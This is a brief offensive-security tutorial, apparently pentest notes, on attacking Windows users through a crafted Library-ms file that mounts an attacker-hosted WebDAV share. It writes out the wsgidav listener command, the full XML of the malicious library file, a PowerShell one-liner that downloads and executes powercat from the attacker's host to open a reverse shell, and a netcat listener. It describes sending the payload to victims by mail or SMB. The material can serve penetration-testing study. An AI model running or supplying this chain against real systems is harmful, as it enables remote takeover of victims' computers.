## Exploiting Windows Users with WebDav mounts
---

With Windows libraries we can craft client-side attacks on Windows. We can serve this configuration for a WebDav mount on the victim's computer. First we start or WebDav listener in the Kali machine with

```shell
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
```

We can craft the following `config.Library-ms` file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<ATTACKER-IP></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Then we can upload to the WebDAV a malicious **Windows Shortcut** file (lnk file) that points to the attacker malicious ip that servers a malicious exe for a reverseshell, like [powercat](https://github.com/besimorhino/powercat). In this section, a simple reverse shell won't work, but we have to use some webserver (like python webserver) with the executable available. Something like that could work for Windows 10/11

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER-IP:WEBPORT/powercat.ps1');
powercat -c ATTACKER-IP-NETCAT -p NETCAT-PORT -e powershell"
```

We copy inside the WebDAV the the link of the powershell command previously created and also the **config-Library.ms** file that we will send to the victim as the payload (via MAIL, SMB, etc...).

with our netcat listener on the attacker side.

```shell
nc -lvp NETCAT-PORT
```
